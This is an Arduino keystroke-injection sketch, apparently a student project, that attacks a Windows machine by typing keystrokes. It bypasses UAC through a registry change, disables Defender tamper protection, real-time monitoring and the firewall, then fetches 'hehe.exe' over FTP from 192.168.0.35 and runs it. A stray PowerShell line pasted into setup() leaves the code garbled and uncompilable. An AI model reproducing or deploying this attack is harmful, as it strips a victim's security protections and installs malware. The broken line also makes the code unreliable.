#include "HID-Project.h"
#include <HID-Settings.h>


//Global Variables that are CONSTANT and DON'T CHANGE and are needed for all functions.
#define LED_CAPS_LOCK (1 << 1)      // B00000010
const int SUPER_SHORT_DELAY = 50;
const int SHORT_DELAY = 200;
const int MEDIUM_DELAY = 500;
const int LONGER_MEDIUM_DELAY = 650;
const int LONG_DELAY = 1000;

const char LeftCtrl = KEY_LEFT_CTRL;
const char LeftShift = KEY_LEFT_SHIFT;
const char WinKey = KEY_LEFT_GUI;
const char Enter = KEY_RETURN;
const char Tab = KEY_TAB;
const char Spacebar = 0x20;

const String ftpIP = "192.168.0.35";
const String ftpUser = "ftp";



void setup() {

  //Disable Capslock
  DisableCaps();
   delay(MEDIUM_DELAY);
    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0(exit(delay(MEDIUM_DELAY);


  //Start Keyboard Input
  Keyboard.begin();
  delay(MEDIUM_DELAY);


  //Open Elevated Powershell and Disable UAC
  BypassUAC();

  //Disable Tamper Protect
  msDefenderDisable();

  //Open Elevated Powershell
  ElevatePowershell();

  //Disable Anti-Virus
  EnterDisableCommands();

  //FTP commands.
  FTPconnect();

  //RUN THE MALWARE.
  ExecuteOrder66();





  //Keyboard Sim Stop
  Keyboard.end();
}

//Disable MS Defender using Tabs and Space.
void msDefenderDisable() {


  //Call Run and Open ThreatCenter
  CallRun();

  //Open Defender.
  Keyboard.print("windowsdefender://threatsettings/");
  BootKeyboard.write(Enter);
  delay(LONGER_MEDIUM_DELAY);

  for (int i = 0; i <= 3; i++) {
    BootKeyboard.write(Tab);
    delay(SUPER_SHORT_DELAY);
  }
  delay(SHORT_DELAY);
  BootKeyboard.write(Spacebar);
  delay(SHORT_DELAY);


}

//Function calls Run Command
void CallRun() {

  Keyboard.press(WinKey);
  Keyboard.write('r');
  delay(SHORT_DELAY);
  Keyboard.release(WinKey);
  delay(SHORT_DELAY);

}


//Bypass UAC
void BypassUAC() {

  //Call Run and Open Powershell
  CallRun();

  //Call the Function to elevate powershell.
  ElevatePowershell();

  for (int i = 0; i <= 2; i++) {
    Keyboard.write(Tab);
    delay(SHORT_DELAY);
  }
  EnterFunction(); //First Use #I swear this has a purpose.
  Keyboard.print("Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0");
  EnterFunction();
  Keyboard.print("exit");
  EnterFunction();




}
//Modularizing This because I'm calling it twice.
void ElevatePowershell() {

  //Reopen Powershell
  CallRun();

  //Open Elevated Powershell
  Keyboard.print("Powershell");
  delay(SUPER_SHORT_DELAY);
  Keyboard.press(LeftCtrl);
  Keyboard.press(LeftShift);
  EnterFunction(); //Second Use
}

//Enter Function
void EnterFunction() {
  //I'M TIRED OF SEEING THIS IN MY CODE, IM MAKING IT A FUNCTION. #I might remove it to Keypress.write(Enter)
  Keyboard.press(Enter);
  delay(SHORT_DELAY);
  Keyboard.releaseAll();
  delay(SHORT_DELAY);
}

//Disable AntiVirus and Firewall.
void EnterDisableCommands() {
  delay(SHORT_DELAY);
  Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
  EnterFunction();
  delay(SUPER_SHORT_DELAY);
  Keyboard.print("Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False");
  EnterFunction();
}

//FTP connect Function
void FTPconnect() {

  //Connect to FTP server and download Malware.
  Keyboard.print("ftp " + ftpIP); //Change IP for presentation, Testing IP address.
  EnterFunction();
  BootKeyboard.print(ftpUser); //ftp login
  EnterFunction();

  //This was originally one line, that had to be divided up into this, due to corruption issues.
  Keyboard.print("get");
  EnterFunction();

  Keyboard.print("hehe.exe");
  EnterFunction();

  Keyboard.print("C:\\hehe.exe");
  EnterFunction();

  BootKeyboard.print("bye"); //leave FTP
  EnterFunction();


}

//FINALLY WE'RE HERE.
void ExecuteOrder66() {


  //Run Malware
  Keyboard.print("C:\\hehe.exe");
  EnterFunction();

}

//This removes the Caps Lock issue.
//If caps lock was enabled, it would destory the pasting of the code from the arduino. by making sure it's disabled it will always run the code 100% of the time.
void DisableCaps(){

  BootKeyboard.begin();
  delay(SUPER_SHORT_DELAY);

  if (BootKeyboard.getLeds() & LED_CAPS_LOCK) {
    // caps lock is on
    BootKeyboard.write(KEY_CAPS_LOCK); //If Caps is on, this will hit caps again to disable it.
    // Test Code - Keyboard.print("Caps is now OFF");
  }
  BootKeyboard.end();
  
  }












void loop() {
}
